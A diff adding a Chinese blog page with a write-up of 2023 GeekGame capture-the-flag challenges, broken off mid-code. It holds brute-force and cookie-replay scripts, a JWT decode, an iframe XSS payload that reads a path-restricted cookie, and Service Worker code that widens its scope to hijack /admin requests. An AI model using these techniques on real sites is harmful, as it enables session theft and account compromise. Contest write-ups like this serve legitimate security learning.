@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2023 GeekGame WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2023 GeekGame WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2023-10-20
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/nodejs/" title="NodeJS">
+                      #NodeJS
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="Emoji-Wordle"><a href="#Emoji-Wordle" class="headerlink" title="Emoji Wordle"></a>Emoji Wordle</h1><p>才发现原来 emoji <span class="hexo-wm">𝒔‌‍⑶ⅴ𝐞𝘯·‌‍ꜱⅈ‌‍ｔ𝘦‌</span>可以被放在代码里和 GET 传参里 ~</p>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="image-1.png" alt="image-1.png"></p>
+<h3 id="1-1-爆破法"><a href="#1-1-爆破法" class="headerlink" title="1.1 爆破法"></a>1.1 爆破法</h3><p>根据提示，Level1的答案不变，<br>采用无脑爆破法枚举每<span class="hexo-wm">𝒔​​⑶𝐯𝘦𝐧․‍ꜱｉ‍​𝒕ｅ‍</span>个位置上的 emojis</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> requests
+
+YES <span class="token operator">=</span> <span class="token string">'🟩'</span>
+NO <span class="token operator">=</span> <span class="token string">'🟥'</span>
+MAYBE <span class="token operator">=</span> <span class="token string">'🟨'</span>
+
+URL <span class="token operator">=</span> <span class="token string">'https://prob14.geekgame.pku.edu.cn/level1'</span>
+r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'placeholder="(.*)"'</span><span class="token punctuation">)</span>
+r2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'results.push\("(.*)"\)'</span><span class="token punctuation">)</span>
+
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+emoji <span class="token operator">=</span> <span class="token string">"A"</span>
+
+location <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        guess <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
+            <span class="token string">'guess'</span><span class="token punctuation">:</span> emoji  
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+
+        result <span class="token operator">=</span> r2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span>emoji<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> YES<span class="token punctuation">:</span>
+                location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
+    
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            new_emoji <span class="token operator">=</span> r1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+        e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_emoji<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    
+        emoji <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>e<span class="token punctuation">)</span></code></pre>
+<p>运行代码直到全部变绿</p>
+<pre class="language-none"><code class="language-none">💈💅👼💁👦👗💊💊👱👇👔💆👺👦👓👳👔👉👞💄👧👘💃👺👸👴👿👙👵💆👩👽👛👓👦👝👢💃💅👶👅💈👈💅👼👁👃💂👆👄👂👳👲👢💆👤👜👆👺👱👺👛👆👡
+🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩</code></pre>
+<h3 id="1-2-逻辑法"><a href="#1-2-逻辑法" class="headerlink" title="1.2 逻辑法"></a>1.2 逻辑法</h3><p>我们已知总共有 128 <span class="hexo-wm">s‍﻿⑶𝒗𝘦ｎ．﻿​ѕｉ﻿‍ｔｅ‍</span>个 emojis<br>如果我们已知题目中包含的 64 种 emojis<br>就能通过每次填充 64 个相同的 emoji 来得知哪些位置是该 emoji<br>因此只需要 63 次就能猜出答案</p>
+<p>至于如何确定题目使用的是哪64种emojis<br>可以通过在大量多次生成 <span class="hexo-wm">𝘀‍‍⑶vｅ𝒏∙﻿ѕⅈ﻿​𝒕e‌</span>placeholder 来确定</p>
+<h3 id="1-3-提交-emojis"><a href="#1-3-提交-emojis" class="headerlink" title="1.3 提交 emojis"></a>1.3 提交 emojis</h3><p>提交 emojis <span class="hexo-wm">𝐬‍⑶𝘷ｅ𝒏·﻿s𝐢﻿​𝘵℮​﻿</span>获得 flag</p>
+<pre class="language-none"><code class="language-none">Your flag: flag{s1Mp1e_brut3f0rc3}</code></pre>
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>根据 Hint <span class="hexo-wm">𝘴‍‌𝟯𝐯𝘦ｎ.‌﻿ѕⅈ﻿𝘵ｅ‌</span>查看 Cookie</p>
+<pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM0N1x1RDgzRFx1REM3Q1x1RDgzRFx1REM1Nlx1RDgzRFx1REM3NVx1RDgzRFx1REM3RFx1RDgzRFx1REM0NFx1RDgzRFx1REM4Mlx1RDgzRFx1REM0MVx1RDgzRFx1REM1Mlx1RDgzRFx1REM2NVx1RDgzRFx1REM1RFx1RDgzRFx1REM4QVx1RDgzRFx1REM2Mlx1RDgzRFx1REM1RVx1RDgzRFx1REM0MFx1RDgzRFx1REM0NVx1RDgzRFx1REM2OFx1RDgzRFx1REM4M1x1RDgzRFx1REM4Mlx1RDgzRFx1REM3QVx1RDgzRFx1REM4MFx1RDgzRFx1REM2NVx1RDgzRFx1REM3QVx1RDgzRFx1REM3Q1x1RDgzRFx1REM3Q1x1RDgzRFx1REM4Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM3M1x1RDgzRFx1REM4N1x1RDgzRFx1REM3OFx1RDgzRFx1REM4MVx1RDgzRFx1REM1OFx1RDgzRFx1REM2M1x1RDgzRFx1REM0NVx1RDgzRFx1REM3N1x1RDgzRFx1REM0MVx1RDgzRFx1REM0M1x1RDgzRFx1REM1QVx1RDgzRFx1REM1MVx1RDgzRFx1REMzQlx1RDgzRFx1REM0Nlx1RDgzRFx1REM2QVx1RDgzRFx1REM4M1x1RDgzRFx1REM1NFx1RDgzRFx1REM3NVx1RDgzRFx1REM4N1x1RDgzRFx1REM4OVx1RDgzRFx1REM3Mlx1RDgzRFx1REM3Q1x1RDgzRFx1REM3Qlx1RDgzRFx1REM0NVx1RDgzRFx1REM1NFx1RDgzRFx1REM1OVx1RDgzRFx1REM2Nlx1RDgzRFx1REM2QVx1RDgzRFx1REM1Qlx1RDgzRFx1REM4OFx1RDgzRFx1REM4NVx1RDgzRFx1REM4OFx1RDgzRFx1REM2OVx1RDgzRFx1REM1NFx1RDgzRFx1REM2NVx1RDgzRFx1REM3NFx1RDgzRFx1REM1NyJ9LCJuYmYiOjE3MDEzNTAxODYsImlhdCI6MTcwMTM1MDE4Nn0.eC3acijxIGEM1alsrrBpd_SgxcYbxXc2HCbmYNKNmJg</code></pre>
+<p>在 <a href="jwt.io">jwt.io</a> 解密后获得</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">"level"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>
+    <span class="token property">"remaining_guesses"</span><span class="token operator">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span>
+    <span class="token property">"target"</span><span class="token operator">:</span> <span class="token string">"👇👼👖👵👽👄💂👁👒👥👝💊👢👞👀👅👨💃💂👺💀👥👺👼👼💆👆👳💇👸💁👘👣👅👷👁👃👚👑🐻👆👪💃👔👵💇💉👲👼👻👅👔👙👦👪👛💈💅💈👩👔👥👴👗"</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token property">"nbf"</span><span class="token operator">:</span> <span class="token number">1701350186</span><span class="token punctuation">,</span>
+  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1701350186</span>
+<span class="token punctuation">}</span></code></pre>
+<p>输入</p>
+<pre class="language-none"><code class="language-none">👇👼👖👵👽👄💂👁👒👥👝💊👢👞👀👅👨💃💂👺💀👥👺👼👼💆👆👳💇👸💁👘👣👅👷👁👃👚👑🐻👆👪💃👔👵💇💉👲👼👻👅👔👙👦👪👛💈💅💈👩👔👥👴👗</code></pre>
+<p>获得 flag</p>
+<pre class="language-none"><code class="language-none">Your flag: flag{d3c0d1n9_jwT_15_345y}</code></pre>
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>这次的 Cookie 中没有直接给出答案<br>由于服务器不存储状态</p>
+<blockquote>
+<p>这点可以从 Hint 或者 Cookie 名称 <span class="hexo-wm">𝘀‌3𝒗𝐞𝘯．﻿‍𝘀𝐢﻿﻿𝐭e‍‍</span>PLAY_SESSION 中<br>得知服务端使用的是 Play <span class="hexo-wm">𝐬‍‌⑶𝐯𝐞𝘯․‌​𝘴𝘪‌tｅ﻿‍</span>Framework</p>
+</blockquote>
+<p>我们通过多次携带相同的 Cookie 进行爆破<br>ps: 好像本题的 Cookie 会超时，<span class="hexo-wm">𝘀‍﻿³𝐯e𝘯∙‍ꜱｉ​𝐭𝘦﻿‍</span>要在短时间内进行爆破（）</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> requests
+
+YES <span class="token operator">=</span> <span class="token string">'🟩'</span>
+NO <span class="token operator">=</span> <span class="token string">'🟥'</span>
+MAYBE <span class="token operator">=</span> <span class="token string">'🟨'</span>
+
+URL <span class="token operator">=</span> <span class="token string">'https://prob14.geekgame.pku.edu.cn/level3'</span>
+r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'placeholder="(.*)"'</span><span class="token punctuation">)</span>
+r2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'results.push\("(.*)"\)'</span><span class="token punctuation">)</span>
+
+emoji <span class="token operator">=</span> <span class="token string">"A"</span>
+location <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+bad_location <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+
+JWT <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span><span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'PLAY_SESSION'</span><span class="token punctuation">)</span>
+
+good <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+bad <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        e <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>good<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> idx <span class="token keyword">not</span> <span class="token keyword">in</span> bad_location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> e
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    guess <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">'guess'</span><span class="token punctuation">:</span> emoji
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">'PLAY_SESSION'</span><span class="token punctuation">:</span> JWT
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
+    result <span class="token operator">=</span> r2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>emoji<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> YES<span class="token punctuation">:</span>
+            location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> NO<span class="token punctuation">:</span>
+            bad<span class="token punctuation">.</span>append<span class="token punctuation">(</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> MAYBE<span class="token punctuation">:</span>
+            good<span class="token punctuation">.</span>append<span class="token punctuation">(</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            bl <span class="token operator">=</span> bad_location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            bl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>
+            bad_location<span class="token punctuation">[</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> bl
+  
+    new_emoji <span class="token operator">=</span> r1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_emoji<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> new_emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token keyword">in</span> bad<span class="token punctuation">:</span>
+                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>get<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
+  
+    emoji <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>e<span class="token punctuation">)</span></code></pre>
+<p>获得 flag</p>
+<pre class="language-none"><code class="language-none">Your flag: flag{StateIess_game_IS_a_b4d_1d3a}</code></pre>
+
+<h1 id="第三新XSS"><a href="#第三新XSS" class="headerlink" title="第三新XSS"></a>第三新XSS</h1><h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h2><p>由于页面中的 flag <span class="hexo-wm">ѕ‍﻿3𝒗𝐞n•﻿𝐬ⅈ‍﻿ｔ𝘦‌</span>的 Cookie 设置了 <code>path=/admin</code><br>所以不能直接在页面中读取 包含 flag 的 Cookie</p>
+<h3 id="1-1-iframe-读取信息"><a href="#1-1-iframe-读取信息" class="headerlink" title="1.1 iframe 读取信息"></a>1.1 iframe 读取信息</h3><p>根据 Hint 可知<br>由于在同源环境下<br>可通过 iframe 读取 <span class="hexo-wm">𝘀﻿﻿3𝘷ℯｎ.​𝒔ｉ﻿𝐭ｅ​‌</span>Cookie 并输出</p>
+<p>因此有 Pay<span class="hexo-wm">s​﻿³𝘷en∙﻿﻿𝒔i‍𝐭𝐞‍​</span>load ：</p>
+<pre class="language-none"><code class="language-none">&lt;iframe src="/admin/"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+document.title = 'running';
+setTimeout(()=&gt;{
+    document.title = 'got: ' + document.querySelector('iframe').contentDocument.cookie;
+}, 500);
+&lt;/script&gt;</code></pre>
+<p>即可在 xss bot 处获得 flag 1：</p>
+<p><img src="image-2.png" alt="image-2.png"></p>
+<h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><pre class="language-python" data-language="python"><code class="language-python">driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>admin_url<span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
+driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'document.cookie = "flag=</span><span class="token interpolation"><span class="token punctuation">{</span>getflag<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">; path=/admin"'</span></span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
+<p>由这段代码我们发现<br>xss bot<span class="hexo-wm">𝘴‌﻿𝟯𝘷ｅｎ∙‌​𝐬𝘪﻿t𝘦‌</span> 先访问了网页<br>然后关掉浏览器并重新打开了 /admin</p>
+<h3 id="2-1-Service-Worker-工作范围提升"><a href="#2-1-Service-Worker-工作范围提升" class="headerlink" title="2.1 Service Worker 工作范围提升"></a>2.1 Service Worker 工作范围提升</h3><p>由 Hint <code>Service Worker</code> 可以缓存之前<span class="hexo-wm">𝒔​​𝟯𝐯ｅ𝐧․﻿𝘴i‌﻿𝘵𝐞‌</span>打开过的网页</p>
+<blockquote>
+<p>Service Workder：<span class="hexo-wm">ѕ﻿​3ⅴ𝘦𝘯<span class="hexo-wm">ꜱ‌³ⅴℯn∙‍​ꜱⅈ﻿ｔ℮‌</span>∙‌‍sⅈ‍​𝘵e​</span>Progressive Web App 的一部分<br>意义在于让网页可以提供与原生 App 类似的体验，在离线时仍然可以工作</p>
+</blockquote>
+<p>因此我们可以利用 <code>Service Worker</code> 劫持 /ad<span class="hexo-wm">s‌³𝘷𝐞𝐧．​𝒔ⅈ﻿te​</span>min 目录</p>
+<p>但是浏览器默认限制 Service Worker <span class="hexo-wm">s​﻿𝟯𝘷𝐞𝘯•‌𝘴𝐢‌﻿𝐭℮﻿‍</span>的工作范围仅限于它所在的这个目录</p>
+<blockquote>
+<p>假设 Service Worker 的脚本是 /path_to/sw.js<br>那么它只能看到并修改 <span class="hexo-wm">𝒔‍3vℯ𝐧．﻿​ꜱ𝘪‌​𝘵e﻿</span>/path_to/ 底下的所有 HTTP 请求<br>因此 /admin/<span class="hexo-wm">s﻿𝟯𝘷𝐞𝒏․‌﻿𝘀𝘪‍‌𝐭e​</span> 还是安全的</p>
+</blockquote>
+<p>我们可以利用设置响应头 <code>Service-Worker-Allowed: /</code><br>手动提升它的默认工作范围到 <code>/</code> 来绕过限制</p>
+<h3 id="2-2-注册-Service-Worker-缓存页面"><a href="#2-2-注册-Service-Worker-缓存页面" class="headerlink" title="2.2 注册 Service Worker 缓存页面"></a>2.2 注册 Service Worker 缓存页面</h3><h4 id="2-2-1-flag2-a"><a href="#2-2-1-flag2-a" class="headerlink" title="2.2.1 flag2_a"></a>2.2.1 flag2_a</h4><pre class="language-none"><code class="language-none">'Content-Type': 'text/html',</code></pre>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">await</span> navigator<span class="token punctuation">.</span>serviceWorker<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'/flag2_b/sw.js'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">scope</span><span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'done'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'running'</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre>
+<h4 id="2-2-2-flag2-b"><a href="#2-2-2-flag2-b" class="headerlink" title="2.2.2 flag2_b"></a>2.2.2 flag2_b</h4><pre class="language-none"><code class="language-none">'Content-Type': 'text/javascript',
+'Service-Worker-Allowed': '/',</code></pre>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'/admin/'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
